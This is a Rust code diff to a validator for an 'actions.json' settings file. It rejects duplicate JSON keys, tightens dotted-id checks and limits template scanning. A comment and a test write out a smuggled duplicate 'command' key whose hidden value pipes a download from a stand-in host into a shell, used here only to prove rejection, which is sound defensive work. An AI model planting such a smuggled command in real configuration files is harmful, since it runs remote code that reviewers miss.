@@ -332,6 +332,13 @@ pub fn classify_id(id: &str) -> IdClass {
     IdClass::Invalid
 }
 
+/// Dotted ids this layer knows are built-ins without the merged registry
+/// (WP-52's): the locked items, the hosted commands and the `os.*` OS-only
+/// commands. Any other dotted id in a user `actions.json` is a grammar error.
+pub fn is_known_dotted_builtin(id: &str) -> bool {
+    LOCKED_IDS.contains(&id) || is_hosted_command(id) || id.starts_with("os.")
+}
+
 /// §4.6: hosted commands (`terminal.*` and the three dispatch-input keys).
 pub fn is_hosted_command(id: &str) -> bool {
     id.starts_with("terminal.") || HOSTED_COMMANDS.contains(&id)
@@ -664,10 +671,105 @@ pub struct ValidateContext<'a> {
     pub user_action_ids: Option<&'a HashSet<String>>,
 }
 
-/// Parses strict JSON (no comments, no trailing commas) and validates it.
-/// Returns the document only when it parsed.
+/// A pass over the raw JSON that refuses a repeated key in any object.
+/// `serde_json::Value` keeps the last duplicate silently, so
+/// `{"command":"echo ok","command":"curl …|sh"}` would otherwise validate
+/// as the second command while a reviewer reads the first.
+struct NoDuplicateKeys;
+
+impl<'de> Deserialize<'de> for NoDuplicateKeys {
+    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
+    where
+        D: serde::Deserializer<'de>,
+    {
+        deserializer.deserialize_any(NoDuplicateKeysVisitor)
+    }
+}
+
+struct NoDuplicateKeysVisitor;
+
+impl<'de> serde::de::Visitor<'de> for NoDuplicateKeysVisitor {
+    type Value = NoDuplicateKeys;
+
+    fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        formatter.write_str("a JSON value")
+    }
+
+    fn visit_bool<E>(self, _: bool) -> Result<Self::Value, E>
+    where
+        E: serde::de::Error,
+    {
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_i64<E>(self, _: i64) -> Result<Self::Value, E>
+    where
+        E: serde::de::Error,
+    {
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_u64<E>(self, _: u64) -> Result<Self::Value, E>
+    where
+        E: serde::de::Error,
+    {
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_f64<E>(self, _: f64) -> Result<Self::Value, E>
+    where
+        E: serde::de::Error,
+    {
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_str<E>(self, _: &str) -> Result<Self::Value, E>
+    where
+        E: serde::de::Error,
+    {
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_unit<E>(self) -> Result<Self::Value, E>
+    where
+        E: serde::de::Error,
+    {
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
+    where
+        A: serde::de::SeqAccess<'de>,
+    {
+        while seq.next_element::<NoDuplicateKeys>()?.is_some() {}
+        Ok(NoDuplicateKeys)
+    }
+
+    fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
+    where
+        A: serde::de::MapAccess<'de>,
+    {
+        let mut seen: HashSet<String> = HashSet::new();
+        while let Some(key) = map.next_key::<String>()? {
+            if seen.contains(&key) {
+                return Err(<A::Error as serde::de::Error>::custom(format!(
+                    "duplicate key `{key}`"
+                )));
+            }
+            map.next_value::<NoDuplicateKeys>()?;
+            seen.insert(key);
+        }
+        Ok(NoDuplicateKeys)
+    }
+}
+
+/// Parses strict JSON (no comments, no trailing commas, no repeated key in
+/// an object) and validates it. Returns the document only when it parsed.
 pub fn validate_bytes(ctx: ValidateContext<'_>, bytes: &[u8]) -> (Option<Value>, Validation) {
-    match serde_json::from_slice::<Value>(bytes) {
+    let parsed = serde_json::from_slice::<Value>(bytes).and_then(|value| {
+        serde_json::from_slice::<NoDuplicateKeys>(bytes).map(|_| value)
+    });
+    match parsed {
         Ok(value) => {
             let validation = validate_document(ctx, &value);
             (Some(value), validation)
@@ -824,10 +926,24 @@ fn validate_action<'a>(
             let id_path = pointer(path, "id");
             match classify_id(id) {
                 IdClass::User => {}
-                IdClass::BareBuiltin | IdClass::DottedBuiltin => v.error(
+                IdClass::BareBuiltin => v.error(
                     "E_ID_BUILTIN",
                     id_path,
                     format!("`{id}` is a built-in id; user actions cannot redefine built-ins"),
+                ),
+                IdClass::DottedBuiltin if is_known_dotted_builtin(id) => v.error(
+                    "E_ID_BUILTIN",
+                    id_path,
+                    format!("`{id}` is a built-in id; user actions cannot redefine built-ins"),
+                ),
+                // A `.` breaks the user-id grammar (§1.2, §10.1); only an id
+                // this layer knows to be a built-in is reported as one.
+                IdClass::DottedBuiltin => v.error(
+                    "E_ID_GRAMMAR",
+                    id_path,
+                    format!(
+                        "`{id}` must match ^[a-z0-9][a-z0-9-]{{0,63}}$ (user action ids have no `.`)"
+                    ),
                 ),
                 IdClass::Package => v.error(
                     "E_ID_BUILTIN",
@@ -1136,11 +1252,10 @@ fn validate_run(run: &Value, path: &str, v: &mut Validation) {
         }
     };
     warn_unknown_keys(object, known, path, v);
-    for (field, value) in object {
-        if field == "kind" {
-            continue;
-        }
-        if let Some(text) = value.as_str() {
+    // Only the kind's own fields are templates; an unknown field (from a
+    // newer file) is preserved and ignored on read (§1.1), never scanned.
+    for field in known.iter().copied().filter(|field| *field != "kind") {
+        if let Some(text) = object.get(field).and_then(Value::as_str) {
             for name in template_variables(text) {
                 if !RUN_VARIABLES.contains(&name.as_str()) {
                     v.error(
@@ -1478,6 +1593,28 @@ mod tests {
     }
 
     #[test]
+    fn duplicate_object_keys_are_not_strict_json() {
+        let c = ctx(FileKind::Actions, SettingsScope::Project);
+        let smuggled = br#"{"version":1,"actions":[{"id":"x","name":"X","scope":"project",
+            "run":{"kind":"shell","command":"echo ok","command":"curl evil | sh"}}]}"#;
+        let (doc, v) = validate_bytes(c, smuggled);
+        assert!(doc.is_none());
+        assert_eq!(codes(&v.errors), vec!["E_JSON"]);
+        assert!(v.errors[0].message.contains("duplicate key `command`"), "{}", v.errors[0].message);
+        let (_, v) = validate_bytes(c, br#"{"version":1,"version":1}"#);
+        assert_eq!(codes(&v.errors), vec!["E_JSON"]);
+        // The same key in sibling objects is not a duplicate.
+        let (doc, v) = validate_bytes(
+            c,
+            br#"{"version":1,"actions":[
+                {"id":"a","name":"A","scope":"project","run":{"kind":"open","url":"https://a"}},
+                {"id":"b","name":"B","scope":"project","run":{"kind":"open","url":"https://b"}}]}"#,
+        );
+        assert!(doc.is_some());
+        assert!(v.is_ok(), "{:?}", v.errors);
+    }
+
+    #[test]
     fn action_ids_follow_the_namespaces() {
         assert_eq!(classify_id("explain-file"), IdClass::User);
         assert_eq!(classify_id("delete"), IdClass::BareBuiltin);
@@ -1491,6 +1628,11 @@ mod tests {
         assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_ID_BUILTIN"]);
         document["actions"][0]["id"] = json!("pane.close");
         assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_ID_BUILTIN"]);
+        document["actions"][0]["id"] = json!("companion.send");
+        assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_ID_BUILTIN"]);
+        // A dotted id that is not a known built-in breaks the user grammar.
+        document["actions"][0]["id"] = json!("my.action");
+        assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_ID_GRAMMAR"]);
         document["actions"][0]["id"] = json!("Bad_Id");
         assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_ID_GRAMMAR"]);
         document["actions"][0]["id"] = json!("explain-file");
@@ -1517,6 +1659,13 @@ mod tests {
         assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_RUN_KIND"]);
         document["actions"][0]["run"] = json!({ "kind": "open", "url": "https://x/{{file.name}}/{{cwd}}" });
         assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_VAR_UNKNOWN"]);
+        // An unknown run field (a newer file's) is preserved and ignored,
+        // never scanned for variables.
+        document["actions"][0]["run"] =
+            json!({ "kind": "open", "url": "https://x/{{file.name}}", "futureField": "{{x}}" });
+        let v = validate_document(c, &document);
+        assert!(v.is_ok(), "{:?}", v.errors);
+        assert!(!v.warnings.is_empty());
         document["actions"][0]["run"] = json!({ "kind": "iyke", "route": "/pane/navigate", "method": "PUT" });
         assert_eq!(codes(&validate_document(c, &document).errors), vec!["E_FIELD"]);
         for run in [
